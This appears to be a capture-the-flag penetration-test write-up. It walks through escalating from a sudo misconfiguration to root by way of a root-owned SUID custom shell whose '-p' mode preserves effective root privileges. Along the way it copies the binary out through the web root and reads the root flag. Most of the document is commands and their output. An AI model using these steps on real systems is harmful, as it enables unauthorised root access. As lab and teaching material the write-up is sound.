# H4ck3rz2 – Pentest Report - SUID Privilege Escalation

## 1. Checking `titouan` Sudo Privileges

The sudo permissions of `titouan` were checked:

```bash
sudo -u titouan sudo -n -l 2>&1
```

Parameters:

* First `sudo -u titouan`: executes the command as `titouan`.
* `sudo -l`: lists the sudo permissions of `titouan`.
* `-n`: prevents an interactive password prompt if a password is needed, and fails.
* `2>&1`: redirects errors to standard output.

Result:

```bash
sudo: a password is required
```

This showed that there was no direct passwordless sudo path from `titouan` to `root`.

## 3. Discovery of a Suspicious SUID Binary

Enumeration of Titouan /home directory

```bash
sudo -u titouan ls -la /home/titouan

-rwsrwsrwt 1 root    root    1298416 Aug 27 09:35 42sh
```

Because the binary was owned by `root` and had the SUID bit enabled, it became the main privilege-escalation candidate.

## 4. Verifying SUID Support

The filesystem containing the binary was inspected:

```bash
sudo -u titouan findmnt -T /home/titouan/42sh -o TARGET,FSTYPE,OPTIONS -n

findmnt: displays information about mounted filesystems.
-T /home/titouan/42sh: identifies the filesystem containing the specified file.
-outpout TARGET,FSTYPE,OPTIONS: displays only:
TARGET: the filesystem mount point.
FSTYPE: the filesystem type.
OPTIONS: the filesystem mount options.
-n: removes the column headers from the output.
```

No nosuid option was present.

This means the filesystem did not disable SUID execution, so the SUID bit on 42sh could be used.

## 5. Initial SUID Execution Test

The binary was first executed normally:

```bash
echo 'id' | sudo -u titouan /home/titouan/42sh

uid=1000(titouan) gid=1000(titouan) groups=1000(titouan)
```

Despite the SUID bit, root privileges were not preserved during normal execution.

A direct attempt to read the root flag also failed:

```bash
echo "sed -n '1p' < /root/root.txt" | \
sudo -u titouan /home/titouan/42sh 2>&1

/home/titouan/42sh: line 1: /root/root.txt: Permission denied
```

This indicated that `42sh` was dropping or not preserving its effective root privileges in its default execution mode.

## 6. Verifying Shell Redirection

To confirm that the failure was caused by permissions rather than unsupported redirection syntax, the same technique was tested against `/etc/passwd`:

```bash
echo "sed -n '1p' < /etc/passwd" | \
sudo -u titouan /home/titouan/42sh

root:x:0:0:root:/root:/bin/bash
```

The shell therefore supported input redirection correctly.

The failure against `/root/root.txt` was specifically related to insufficient privileges.

## 7. Retrieving the `42sh` Binary

The custom binary was copied for local static analysis.

Because `/home/titouan` was not directly accessible by `www-data`, the file was first copied to `/tmp` as `titouan`:

```bash
sudo -u titouan cp /home/titouan/42sh /tmp/42sh.bin

ls -lh /tmp/42sh.bin

-rwxrwxr-x 1 titouan titouan 1.3M ... /tmp/42sh.bin
```

It was then copied to the Web root:

```bash
cp /tmp/42sh.bin /var/www/html/assets/42sh.bin
```

The file was downloaded locally and verified with file:

```bash
curl -f http://10.10.0.56/assets/42sh.bin -o 42sh.bin

file 42sh.bin

ELF 64-bit LSB pie executable, x86-64,
dynamically linked, stripped
```

## 8. Static Analysis

The dynamic symbols related to privilege handling and process execution were inspected:

```bash
objdump -T 42sh.bin | grep -Ei \
'setuid|seteuid|setreuid|setresuid|getuid|geteuid|execve|execvp|system|popen'

setresuid
getuid
geteuid
execve
shell_execve
```

This showed that `42sh` explicitly handled user IDs and process execution.

The binary strings were then searched for privilege-related options:

```bash
strings -a 42sh.bin | grep -i -A3 -B3 privileged

privileged   same as -p
```

This revealed that the shell supported a **privileged mode** through the `-p` option.

## 9. Privileged Mode Exploitation

The SUID binary was executed again using `-p`:

```bash
echo 'id' | sudo -u titouan /home/titouan/42sh -p

uid=1000(titouan) gid=1000(titouan) euid=0(root) egid=0(root) groups=0(root),1000(titouan)
```

This confirmed successful privilege escalation.

The real user remained `titouan`, but the **effective user ID was root**, allowing commands executed by the privileged shell to access root-only resources.

## 10. Root Flag

The root flag was read using the privileged SUID shell:

```bash
echo "sed -n '1p' /root/root.txt" | \
sudo -u titouan /home/titouan/42sh -p

EPI{K0l0r5_4nD_f4nCY_pR0Mp7_4r3_R34lLY_n3C3554Ry}
```

## 11. Attack Path Summary

```text
Authenticated Web RCE
        ↓
www-data
        ↓
sudo misconfiguration
(titouan) NOPASSWD: ALL
        ↓
titouan
        ↓
No passwordless sudo to root
        ↓
SUID enumeration
        ↓
/home/titouan/42sh
root-owned + SUID
        ↓
Static analysis
        ↓
Privileged mode discovered (-p)
        ↓
42sh -p
        ↓
euid=0(root)
        ↓
/root/root.txt
        ↓
Root flag retrieved
```

## 12. Main Security Issue

The critical vulnerability was:

> A custom shell owned by `root` was configured with the SUID bit and supported a privileged execution mode (`-p`) that preserved its effective root UID.